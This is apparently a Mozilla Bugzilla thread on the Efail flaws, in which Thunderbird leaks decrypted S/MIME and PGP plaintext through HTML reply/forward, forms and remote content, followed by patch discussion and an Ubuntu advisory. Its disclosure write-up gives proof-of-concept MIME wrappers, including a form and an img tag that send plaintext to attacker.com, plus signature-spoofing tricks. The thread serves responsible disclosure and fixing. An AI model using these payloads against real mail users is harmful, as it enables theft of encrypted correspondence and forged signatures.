User Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:52.0) Gecko/20100101 Firefox/52.0
Build ID: 20180326230345
Steps to reproduce:
A variant of Efail's direct exfiltration attack still work in TB nightly (2018-05-22). S/MIME: decrypted MIME parts can be completely hidden with CSS; if user replies/forwards in HTML format the (non-visible) plaintext is leaked, otherwise (in text-only reply mode) the victim could be fooled by inserting newlines

--BOUNDARY
Content-Type: application/pkcs7-mime; name="smime.p7m"; smime-type=enveloped-data
Content-Transfer-Encoding: base64
...
--BOUNDARY--
---------------------------------------------------
Actual results:
Quoted S/MIME plaintext is hidden and leaked when user replies/forwards the message
Expected results:
Plaintext should in other MIME parts than the very first one should not be quoted

I don't see that - I get no "THIS IS A S/MIME ENCRYPTED MESSAGE....". Are you sure you're using 62 nightly trunk? Or which nightly did you mean? From here <http://ftp.mozilla.org/pub/thunderbird/nightly/latest-comm-central/>
As I've written elsewhere for replies/forwards efail is only a bit mitigated now. But the sample eml you provided here - that case is fixed by parsing parts separately.

Reproduced with <http://ftp.mozilla.org/pub/thunderbird/nightly/latest-comm-central/thunderbird-62.0a1.en-US.linux-x86_64.tar.bz2> (of course the S/MIME base64 blob needs to be replaced by a S/MIME message you have the secret key for)

From [bug 1419417 comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
3. Only decrypt, if the entire message is encrypted, not attachments
Normally, if we receive an encrypted email, the entire email will be encrypted. There's little point in leaving part of the message encrypted.
Part of the bug here was that we are automatically decrypting and inlining MIME subparts. That led to that "mixed content". Patrick had no way to stop that "mixed content" in Enigmail, because the code is in libmime.
We should only automatically decrypt a message, if the entire message is encrypted. That's true for all normal encrypted emails.
If an attachment is encrypted, we should simply show it as external attachment. The user can click on it to open or save it.
(In the first version of the patch, I might only allow saving the attachment, not opening it directly by double-click - depending on how difficult it is to implement.)
-----
I think that would fix the bug here.
We can either fix that in libmime, or in Enigmail.
Enigmail would have to use Part numbers, which is a little hacky, but advantage is that it's easier to implement than in libmime.Flags: needinfo?(ben.bucksch)

I actually did fix it in Enigmail 2.0.5 a way that works for all use-cases, except for forwarding. The solution works like this: I receive the message URL (including the &part=1.2.3) from libmime, and I also receive the MIME part number that I'm decrypting. From this I can derive if the message is encrypted as a whole (MIME part number == "1") or if the message is an encrypted attachment (URL contains &part=1.2.3, and MIME part number matches /^1.2.3.1/)

Why is the red color from the unclosed <div style="color: red;"> from part1 leaking into the rest of the message? Is the [bug 1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") working as expected? I would expect parsing and outputting to close that div.

As per [bug 1462488 comment #20](/show_bug.cgi?id=1462488#c20 "RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying"): I don't think |<div style="color: red;">| makes anything hidden. A possible attack is |<style>div { display: none; } pre { display: none; }</style>|.
BTW, why is this bug access restricted, if [bug 1462488](/show_bug.cgi?id=1462488 "RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying") is not?

Of course the red color is not meant to hide anything but just to show the problem: Basically, attacker-controlled CSS is leaked into other MIME parts, it defines how sensitive information such as decrypted mails are displayed. This is bad and there are lots of variants of how to actually exploit it.

Please read [bug 1462488 comment #20](/show_bug.cgi?id=1462488#c20 "RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying"). There is not red colour. If instead you use |<style>body { color: red; }</style>| then the whole thing is read since all parts share the same HTML document. That's expected.

@Patrick: nice!
Could you please verify that this fixes the bug here? Then we can set this FIXED and unhide the bug.

The fix does work for most but not all cases in Enigmail 2.0.5 because I wasn't restrictive enough. The rules I described are implemented on master and will be part of the next release. And yes, this fixes the bug in Enigmail. But I can't fix this for S/MIME.

But there is! See <https://bugzilla.mozilla.org/attachment.cgi?id=8980273> and I see this too on trunk
So there is still a problem here
This is the html we're producing for the above test mail on trunk:

</html>
</plaintext></div></body>

Appears the plaintext is closed, but then due to the second </plaintext>, the "could be decrypted part" is interpreted as text.

> But there is!
OK, I see it now. [Comment #0](/show_bug.cgi?id=1464056#c0 "RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward") DID NOT have the <plaintext> tag that causes all the problems.
But that's not a sign that the fix in [bug 1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") didn't work. The HTML is parsed correctly. I ran it in the debugger and the HTML that comes from parsing is this:
<html><head>
<meta http-equiv="content-type" content="text/html; charset="></head><body>
Reply please to this email
<div style="color: red;">
<plaintext>
</plaintext>
</div>
</body></html>
So the code from [bug 1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") DOES work, it closes the <div> and the <plaintext> tags SUCCESSFULLY!!
In the Inspector I see:
<html><head>
<title>Testcase 'reply-mix-css' (S/MIME)</title>
<link rel="important stylesheet" href="chrome://messagebody/skin/messageBody.css">
</head>

<meta http-equiv="content-type" content="text/html; ">

</div> <-- inserted by my code from [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>").
</body></html>
<BR><FIELDSET CLASS="mimeAttachmentHeader"></FIELDSET>

</body>
</html>
</plaintext> <- pseudo tag inserted by Dev tools.
</div> <- pseudo tag inserted by Dev tools.
</div> <- pseudo tag inserted by Dev tools.
</body></html> <- pseudo tag inserted by Dev tools.
The problem comes from the <plaintext> tag which the rendering engine interprets according to:
<https://html.com/tags/plaintext/>
===
The <plaintext> element was used to render HTML code as plain text. Since everything after the opening tag was rendered as plain text, there was no closing <plaintext> tag. This element is obsolete and should not be used.
===
If you remove the plaintext tag from the message, everything becomes good.
So it's interpreted as:
<html><head>
<title>Testcase 'reply-mix-css' (S/MIME)</title>
<link rel="important stylesheet" href="chrome://messagebody/skin/messageBody.css">
</head>

</div> <- pseudo tag inserted by Dev tools.
</div> <- pseudo tag inserted by Dev tools.
</body></html> <- pseudo tag inserted by Dev tools.
All the stuff marked | is displayed verbatim as "plain text". So despite closing the <plaintext> tag correctly, by definition it cannot be closed.
This goes into the same category of problems which can be created with CSS leaking into other message parts. CSS leaks by definition, and <plaintext> has a similar effect.

This patch disallows encrypted sub parts. Only top level encryption will be allowed. If an encrypted subpart is found it is shown as an attachment.
I added a pref mail.decrypt\_children to disable this, in case there is a need for it, which I don't think we know before we deploy it at large scale.
I've tested that
- normal mails work
- normal encrypted mails work (as produced by Thunderbird)
- messages such as [attachment 8980272](/attachment.cgi?id=8980272 "smime-reply-exfiltration.eml") [[details]](/attachment.cgi?id=8980272&action=edit "smime-reply-exfiltration.eml") will be prevented from showing encrypted content inline
I've not tested that an encrypted message containing an encrypted sub part will work. But I have no reason to think it wouldn't. I'm not sure how to produce such a message though.
Patrick, what do you think? And is there a similar check we should add for PGP?Assignee: nobody → mkmelin+mozillaStatus: NEW → ASSIGNED

The idea is very good, and -- given my limited knowledge of libmime -- I think the implementation is reasonable. I don't think we need it in the PgpMimeProxy, I already do something very similar within the Enigmail code.

It's opened like an attachment and you get to select how to open it. I'm not sure there's any way to actually open it for viewing decrypted. (The file seems binary.)

Are you sure this line is correct? I didn't find any other call site where the options are set up that way.

Have you considered:
if (obj->options)
obj->options->is\_child = true;
?
I understand that options have a plethora of fields. Would setting just one field to the right thing? I don't think so.

That should probably be ok to. So far I didn't find a case where options isn't set. It's hard to verify though.

As far as I understand, it's quit a mess. Lots of options that can be set at some point, but often at the points you really need a field from there, it's not set (yet) :/

Can we go with that then, please. Please use the patch where I did the white-space adjustments.
As I said in [comment #28](/show_bug.cgi?id=1464056#c28 "RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward"), I didn't find any other call site where the options are set up that way. Can you show me an example where those options are created to motivate the "new MimeDisplayOptions();"? If it's hard to verify, we should at least run something which is well understood.

In the first line it could be passed as NULL, then it's tested before dereferencing it.
BTW, is MIME\_DRAFTS defined, I've never done the research.

That's incorrect. With that pref set, not even the body in the top part is decrypted.

I suggest to rename the new preference to mailnews.p7m\_child\_external so it lines up with the existing mailnews.p7m\_external.
This patch also fixes the failing test and removes duplicated code.

Came to mind, mailnews.p7m\_child\_external actually seems obsolete now (though leave it for the moment). With mailnews.p7m\_child\_external, p7m attachments are always external so you don't need to set the mailnews.p7m\_external pref.

Naming these pref1 and pref2 makes this very hard to read. Please use the names like p7m\_external instead.

No. When you set mailnews.p7m\_external even the top part is made external. Try it now on a secure BMO message, assuming that you have S/MIME in use. Then you will see it doesn't decode at all.
If the test were more sophisticated, that is with an S/MIME encoded body, you'd see the difference there.
New patch coming. I'll also rename mailnews.p7m\_child\_external to mailnews.p7m\_subparts\_external since users don't know of the MIME tree where subparts are children. Agreed, even the concept of a subpart is difficult to graps.

Sorry I confused the pref names now. It's mailnews.p7m\_external that became obsolete.

Hmm, how can I convince you otherwise:
1) mailnews.p7m\_external==true => all p7m parts are made external, including the top part.
2) mailnews.p7m\_external==false, mailnews.p7m\_subparts\_external==true => (attacking) subparts are made external.
Or are you saying 1) is not a useful option? We'd need to research how people are using it:
<https://www.google.com.au/search?q=mailnews.p7m_external>
There are a few hits and as you know, people cry out when we make the slightest change :-(
We could also research why this was added.

Yes, but I imagine that's not the intended use case.
It's used for (in particular in Italian administration) allowing signed pdf files to get received properly and not have thunderbird trying to decode them.

My 2 cents to the pref names: Prefs are much easier to use when they are in the positive. "external" is essentially "do not show inline", and therefore a negation, and "external false" essentially a double-negation. Even I had a hard time to understand what the pref means.
"show\_foo\_inline" is something that most advanced users can understand, because they know the "show images inline" options.

For the record, the change that added an early return in mime\_find\_clazz can trigger crashes. The code must be allowed to execute until the end of the function, to ensure mimeExternalObjectClass gets initialized correctly, if it's the first time it's being used. I'll fix that in another bug.

# USN-3714-1: Thunderbird vulnerabilities

12 July 2018

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 17.10](/security/notices?release=artful)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

bypass CORS restrictions, obtain sensitive information, or execute

arbitrary code. ([CVE-2018-12359](/security/CVE-2018-12359), [CVE-2018-12360](/security/CVE-2018-12360), [CVE-2018-12362](/security/CVE-2018-12362),

[CVE-2018-12363](/security/CVE-2018-12363), [CVE-2018-12364](/security/CVE-2018-12364), [CVE-2018-12365](/security/CVE-2018-12365), [CVE-2018-12366](/security/CVE-2018-12366))

It was discovered that S/MIME and PGP decryption oracles can be built with

HTML emails. An attacker could potentially exploit this to obtain

sensitive information. ([CVE-2018-12372](/security/CVE-2018-12372))

It was discovered that S/MIME plaintext can be leaked through HTML

reply/forward. An attacker could potentially exploit this to obtain

sensitive information. ([CVE-2018-12373](/security/CVE-2018-12373))

It was discovered that forms can be used to exfiltrate encrypted mail

parts by pressing enter in a form field. An attacker could potentially

exploit this to obtain sensitive information. ([CVE-2018-12374](/security/CVE-2018-12374))

The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

[Decryption oracle PoC 1: Leaking plaintext through reply/forward](attachment.cgi?id=8930484)
— [Details](attachment.cgi?id=8930484&action=edit)

User Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Build ID: 20170929010941
Steps to reproduce:
In the scope of academic research within the efail project, in cooperation with Ruhr-University Bochum and FH Münster, Germany we discovered various security issues in Thunderbird: An attacker who is in possession of S/MIME or PGP encrypted messages can embed them into specially crafted HTML mails and re-send them to the intended receiver. When the message is read and decrypted by the receiver, the plaintext is leaked to an attacker-controlled server. Furthermore, this issue allows an attacker to spoof PGP signatures. The root cause for these vulnerabilities lies in the way Thunderbird handles multipart messages. The general cause is present since Thunderbird version 0.1, released in 2003.
All issues are present in the current Thunderbird version 52.4.0 (if not stated otherwise).
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\* General Cause: Multipart messages are rendered as a single HTML document \*\*\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Thunderbird internally uses HTML to display emails. If a message consists of multiple parts, all parts are put into a single HTML document, separated by a <br>, <fieldset> and <div> tag::
<html>
<head></head>
<body>
<BR><FIELDSET CLASS="mimeAttachmentHeader"></FIELDSET><BR/>
<div class="moz-text-html" lang="x-western">\*part-01\*</div>
<BR><FIELDSET CLASS="mimeAttachmentHeader"></FIELDSET><BR/>
<div class="moz-text-html" lang="x-western">\*part-02\*</div>
etc.
</body>
</html>
This is dangerous to be used in combination with cryptography, because it allows an attacker to wrap encrypted or signed content into her own HTML/CSS code:
multipart/mixed
|--- Content-Type: text/html
| [arbitrary HTML or CSS]
|--- [enc or signed messages]
+--- Content-Type: text/html
[arbitrary HTML or CSS]
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\* Issue A: Leaking encrypted mails \*\*\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
/Attacker model/: Attacker is in possession of S/MIME or PGP/MIME encrypted messages, which she may have obtained as passive man-in-the-middle or by actively hacking into the victim's mail server or gateway
/Attacker's goal/: Leak the plaintext by wrapping the ciphertext into an HTML mail sent to and decrypted by the victim
-------------------------------------------------------------
\*Proof of concept 1: Leaking plaintext through reply/forward\*
-------------------------------------------------------------
Prerequisites:
- victim reads and composes messages in HTML
- victim replies or forwards the message
Attack:
The attacker can hide the encrypted part, for example, in an iframe:
multipart/mixed
|--- Content-Type: text/html
| Please answer to this email
| <iframe width="1" height="1" frameborder="0">
|--- Content-Type: multipart/encrypted
|--- Content-Type: application/pkcs7-mime
+--- Content-Type: text/html
</iframe>
The encrypted part is decrypted as soon as the victim reads the mail. If the victim replies to or forwards the mail, the decrypted plaintext will be sent, hidden in the invisible iframe and without the victim noticing. Note that this variant of the attack only works if message bodys are viewed as original HTML (default) \*and\* the user checked `compose messages in HTML format' (non default). Also note that hundreds of collected S/MIME or PGP/MIME ciphertexts can be embedded in the multipart mail and all the plaintexts leaked with one single reply.
----------------------------------------------------------
\*Proof of concept 2: Leaking plaintext through HTML forms\*
----------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
- victim submits an HTML form by clicking on an area in the message
Attack:
Another variant of the attack, which works since Thunderbird 3.0 is using HTML forms to leak the plaintext:
multipart/mixed
|--- Content-Type: text/html
| <form action="<https://attacker.com/leak>" method="post">
| <button type="submit">
| <textarea
|--- Content-Type: multipart/encrypted
+--- Content-Type: application/pkcs7-mime
Again, the plaintext for hundreds of collected S/MIME or PGP/MIME ciphertexts could be leaked by a single form submission. The user still has to actively submit the form, but with CSS it is possible to make the form being submitted if the user clicks \*somewhere\* into the (harmless) message shown to him which may even security-aware users. Other variants may include setting up fake scrollbars or Thunderbird warnings that submit the form if clicked.
-------------------------------------------------------------
\*Proof of concept 3: Leaking plaintext through src attribute\*
-------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
- victim allows remote content (further attack variants possible, see below)
Attack:
Another variant of this attack is to use the HTML src attribute, for example, for invisible iframes or image tags to leak the plaintext:
multipart/mixed
|--- Content-Type: text/html
| <img src='<https://attacker.com/>
|--- Content-Type: multipart/encrypted
|--- Content-Type: application/pkcs7-mime
+--- Content-Type: text/html
'>
After decryption, the plaintext is urlencoded and sent as HTTP GET request to the attacker if the user allows remote content to be loaded. To encourage this, there are various options:
- The attacker may spoof the mail address to a `trusted' source which the victim already has whitelisted (for example, some company which requires remote image for their mails being readable)
- The attacker may sent a fake newsletter/spam mail and leak the plaintext by tempting the victim to click on a `Click here to unsubscribe' link
- From Thunderbird 12.0 to 52.0.1, remote content had automatically been loaded if a news:// uri schemes was used in the HTML src attribute which could be used to leak the plaintext to a NNTP server
- In the current version (52.4.0), Thunderbird can be tricked into thinking a mail is an RSS feed if the mail begins with certain headers:
From - Fri Nov 17 20:13:09 2017
X-Mozilla-Status2: 00000040
Note that this seems to work only for local (Movemail) message setups, not if the mail is fetched via IMAP or POP3
- In the current version (52.4.0), mailto links can be used to force an HTML context (even if the user has set messages to be neither viewed nor composed in HTML format). While most html tags seem to be filtered, <video poster="url"> gets through and automatically triggers a connection:
mailto:?html-body=%3Cvideo%20poster%3D%22http%3A%2F%2Fattacker.com%22%3E">
Note however, that this can probably not be used to leak plaintext because we have not found a way to define multipart messages to be included in mailto: links
- There may be other bypasses for remote content blocking like <link preconnect="..."> which we reported in October ([bug 1408867](/show_bug.cgi?id=1408867 "RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block"))
Note that again multiple S/MIME and PGP/MIME messages can be leaked in a single mail that is read and decrypted. There seems to be an upper limited of 1024kB for the length of HTTP GET requests sent by Thunderbird, but an attacker can include multiple HTML tags with src attributes in case the messages should exceed this limit.
Find attached three emails which leak S/MIME and PGP/MIME encrypted messages to localhost:8080. For a proof of concept, you need to replace the encrypted parts with S/MIME or PGP/MIME messages you have the private key for, obviously.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\* Issue B: Signature Spoofing Attacks \*\*\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
/Attacker model/: Attacker is in possession of a valid OpenPGP signature from the entity to be impersonated, which she may have obtained from email correspondence, public mailing lists, signed software packages, signed GitHub commits, etc; this should be a realistic scenario, so we don't even need an NSA-like attacker
/Attacker's goal/: Given her own text, the attacker wants to spoof a correct signature to be displayed by Enigmail
There are various ways to achieve this goal. CSS can be used to hide the signed part (for example, by setting the font size or color). Furthermore, the signed part can be embedded by and therefore hidden in HTML tags.
Note that this attack does not seem to work for S/MIME because Thunderbird's S/MIME implementation only shows a valid signature if the whole message (including all parts) is correctly signed.
-------------------------------------------------------------------
\*Proof of concept 1: Signature spoofing with CSS and plaintext tag\*
-------------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
Attack:
The signed part can be hidden by setting the font color to the default background color (white). Furthermore, the <plaintext> tag can be used to get rid of the border being displayed:
multipart/mixed
|--- Content-Type: text/html
| [Arbitrary text inserted by the attacker]
| <div style="color:white"><plaintext>
+--- Content-Type: multipart/signed
[PGP signed part]
------------------------------------------------------------------
\*Proof of concept 2: Signature spoofing with invisible iframe tag\*
------------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
Attack:
The signed part can be hidden in an invisible iframe:
multipart/mixed
|--- Content-Type: text/html
| [Arbitrary text inserted by the attacker]
| <iframe width="1" height="1" frameborder="0"
+--- Content-Type: multipart/signed
[PGP signed part]
Find attached two emails which are displayed as correctly signed by Phil Zimmermann in Thunderbird/Enigmail while the attacker can completely alter the actual text that is shown to the user.

The effective cause of the problem is that libmime produces a single HTML page by concatenating all of the parts together. This means that the HTML sections can already bleed together (and there are definitely bugs on this that I'm not going to try to find right now). The easy way to fix this would be to put every every document in a separate <iframe>, but we would need [bug 80713](/show_bug.cgi?id=80713 "NEW - Need a way to specify an auto-height (size) for an IFRAME such that the frame is given the full height of the contained content (moz-seamless, part of seamless iframes)") to avoid the fixed height issue, and that bug's been on nobody's radar for years. Maybe the fact that there's a security bug in not doing so could light a fire, but I wouldn't hold out high hopes.

We actually support submitting forms? o\_O
My memory isn't entirely wrong: judging from [bug 533545 comment 76](/show_bug.cgi?id=533545#c76 "RESOLVED WONTFIX - Form submission from HTML mail is completely broken (action = get)"), supporting form submission in HTML email is not an intended feature. It was broken at some point, but apparently we never fully ripped out the breakage.

In practice, someone who can inject mail into Movemail is already doing arbitrary file I/O on your machine, which means you've already basically lost the security game.
We do have checks to ignore X-Mozilla-\* headers if it comes from elsewhere, but I think we reused the mbox code to handle movemail.

Yes, S/MIME does have a check such that if the encrypted piece isn't the top-level of the message, it ignores the security status information. This is actually baked in the frontend; the backend library blindly passes everything along with a nesting depth, but the frontend drops everything that's not top-level. It sounds like Enigmail isn't doing the same logic, or just setting the nesting depth unconditionally to 1, which needs to be brought up with the Enigmail folks.Flags: needinfo?(Pidgeot18)

Update from our side: We would like to go full-disclosure in mid April in the scope of an academic paper (covering a whole bunch of email security issues). We think it's a very serious issue: with a single tiny bit of user interaction (or maybe without if the attacker somehow manages to bypass remote content blocking) -- the encrypted mails of years can be leaked.
One workaround would be to not render HTML content in encrypted mails (Enigmail does this already for PGP/INLINE) or consequently block remote content (not give the user an option!), forms etc. for encrypted content and not to allow users to click on links etc. In respect to [bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED"), this seems to be necessary anyway.

Issue B is fixed in Enigmail, that's a pure UI thing.
Issue A is fixed as far as I can:
- PoC 1 is "fixed" in Enigmail by displaying a warning to the user if a "suspicious" type of PGP/MIME (or inline-PGP) structure is detected.
- PoC 2 and PoC 3: AFAICT this cannot be addressed by EnigmailFlags: needinfo?(patrick)

Since when is it fixed? Just asking because TB 52.6 still allows partly S/MIME encrypted mails, it just does not allow partly S/MIME signed mails (therefore Issue B, PoC 1/2 is not vulnerable for S/MIME). Such a fix would mean that emails with e.g. only the attachment encrypted will no longer be decrypted, correct?

- separate DOM for each HTML body part (best fix, but hardest to implement)
- same fix(?) as for S/MIME (drawback: partly encrypted mails will no longer be decrypted)
- do not give user an option to load remote content in encrypted mails (just a workaround!)

Note:
- Issue A, PoC 1 (leak plaintext via reply/forward) still works in
TB-nightly for S/MIME encrypted messages (mitigated in Enigmail)
- Issue A, PoC 3 (leak plaintext via remote content) still works in
TB-nightly for S/MIME encrypted messages (and for PGP too I guess)
This has \*not\* been fixed by [bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED"). The problem for Issue A, PoC 3 is that remote content \*within\* encrypted messages is disabled now ([bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED")), but in \*this\* bug ("direct exfiltration") we wrap the encrypted MIME part and prepend <img src="<http://attacker.com/> in a previous MIME part in the same email -- where remote content still seems to be allowed. TB puts all together in a single HTML document to be rendered.
All those plaintext leaks (Issue A, Poc \*) are based on the problem that multiple MIME parts are put into the same DOM. This can probably not be changed fast. But what about the following quick fix: Do not decrypt S/MIME and OpenPGP encrypted messages if they are not top-level (within in the MIME tree). This breaks partly encrypted messages but they should not happen often in practice (e.g. only-encrypt-the-attachment).

We don't indicate that partly S/MIME mail is anything different from regular email. While the user could still see the decrypted email, there would be no indication that the email was encrypted in the first place unless the user desired to view source (or wondered why the message couldn't be found when searching message bodies).

Fix PoC 1 by only forwarding/replying to encrypted messages as plaintext.
That is not the neatest fix, but at least it's safe.
This should be the last of the attack vectors.
We can try to think of a better fix but time is running up.
What we could do is parse each part separately into a document, then insert each element after one another. But libmime is so much magic that it's really hard to follow where to put the logic.Assignee: Pidgeot18 → mkmelin+mozillaStatus: UNCONFIRMED → ASSIGNEDEver confirmed: true

That comment isn't clear. Are you saying that when replying to an encrypted HTLM message or forwarding it, we'll convert the reply or forwarded message to plaintext?
That's what the code appears to do. If the original was encrypted, the new message (reply/forwarded) will be converted to plaintext.
I can't see that this will be very popular. People might want to work around that with using "Edit as new". What happens in that case?

I think this is a no-go for many users who use encrypted messages. Here is what I did in Enigmail: I (re-)parse the message to get the message structure (and then interpret the structure. If an unencrypted MIME part as a PGP/MIME encrypted sibling (i.e. MIME parts on the same level), then I display a warning to the user saying that the message may lead to revealing sensitive information. I would also agree that in this case conversion to plain text is a valid option.

Yes, I think you a have to have a mixture. You have an apparently unencrypted HTML message that contains a hidden encrypted MIME part. The only way to achieve this is by a structure like below, which implies that a multipart/encrypted message is on the same level or below an unencrypted message part:
multipart/mixed 1.1
|--- Content-Type: text/html 1.1.1
| <form action="<https://attacker.com/leak>" method="post">
| <button type="submit">
| <textarea
|--- Content-Type: multipart/encrypted 1.1.2
Whether or not 1.1 is a sub-part of an encrypted message does not matter. Once you have the decrypted MIME tree, you need to have a mixture of non-encrypted and encrypted MIME parts. Otherwise the trick of hiding an encrypted message in an unencrypted message cannot work.

Is it not allowed to have encrypted parts as siblings? E.g. part 1.1.1 also being encrypted.

It's not a stupid question at all :) It's technically allowed and possible to have encrypted and non-encrypted parts as siblings. However, no email client would ever produce such a message. The only way to achieve such a message structure is to manually craft it, and therefore the user should be warned if he gets such a message.

Agreed with @Patrick. If part 1.1.1 is actually encrypted or not should be irrelevant for the attack (the attacker could do both).
The major problem imho is multiple MIME parts that are bleeding into each other -> attacker-controlled HTML/CSS content is mixed with sensitive, plaintext content, rendered into the same DOM. Given the evolution web standards, other variants of the attack may only be a matter of time. At least I would not trust mail encryption my life (but some people actually have to) :/
Btw, I like Enigmail's handling of PGP/INLINE where the whole email is forced to be rendered as text-only.

I'm slightly confused now. Patrick said a mixture is required ([comment 28](/show_bug.cgi?id=1419417#c28 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")).
But from later comments, it sounds separately encrypted siblings is technically allowed and possible (for an attacker). The approach Enigmail took of warning if only one sibling was unencrypted would seem still attackable for that case.

Yes this is unfortunate and something I'd like to change - but it's a larger project to do that properly.

You're right, my example is not complete. In my example in [comment #28](/show_bug.cgi?id=1419417#c28 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") the MIME part 1.1.1 could also be a multipart/encrypted message part which contains a text/html part. Or the structure could be like below, which would probably also be attack-able:
multipart/mixed 1.1
|--- Content-Type: text/html 1.1.1
| <form action="<https://attacker.com/leak>" method="post">
| <button type="submit">
| <textarea
|--- Content-Type: multipart/mixed 1.1.2
|--- Content-Type: multipart/encrypted 1.1.2.1
How about the following rule: there should be no "text/html" MIME part earlier in the tree than a "multipart/encrypted" MIME part - after everything earlier in the tree has been decrypted (i.e. tree traversal by depth first).
I'm not sure how to deal with message/rfc822 MIME parts though (attached messages).

What exactly is the attack vector? Do you have a test case and can you explain how the patch addresses the attack vector?
I just want to make sure we're not throwing out the baby with the bathwater given Patrick's [comment #25](/show_bug.cgi?id=1419417#c25 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
"I think this is a no-go for many users who use encrypted messages."
So a "no-go" doesn't appear very attractive even as a band-aid.

Simply put: if you have encrypted messages for A that you want to read, send a mail to A, asking them a question so that A would reply. Craft the mail to secretly (like in the alternative content for a supported element) include the encrypted messages. The reply you get back now have all the content of the messages in decrypted from.
By converting to plain text the unintended messages are either removed in the html->plaintext process, or there clearly visible to the user in the reply window.
You could argue the attack requires you to obtain those encrypted mails, which may be easy or not, depending on what kind of an attacker you are. (Maybe you're the admin of the mail server, then it's easy.) But then again, to protect against these kind of attacks is the motivation to use encryption in the first place. Traffic between mail servers is largely secured nowadays.

Oh, I understand the simple version ;-) Do you have a test message or instructions how to easily construct one? Or would you like me to send you a signed S/MIME message, so you can send a "crafted" encrypted one back?

I'll get back to you in the evening. But basically, in <https://bugzilla.mozilla.org/attachment.cgi?id=8930485> the red area would include decrypted content if you had the proper keys. (And would obviously be hidden by styling etc. in the real world)

OK, here's an example where I put an S/MIME block I can decrypt into a part of the message.
Upon HTML reply the decrypted text is found visibly in the body of the mail and is shipped out upon send.

As far as I can see, this doesn't work. With the patch applied, the decrypted text is still present invisibly in the composition. Also, the composition is NOT downgraded to plaintext.
Looks like encryptedURIService->IsEncrypted(originalMsgURI, &isEncrypted); will return 'false' since only a message part is encrypted. I don't know, I haven't debugged it.
At least with the example I attached, "forward" doesn't appear to be an attack vector. I don't see the decrypted text anywhere in the forwarded message when inspecting the HTML.

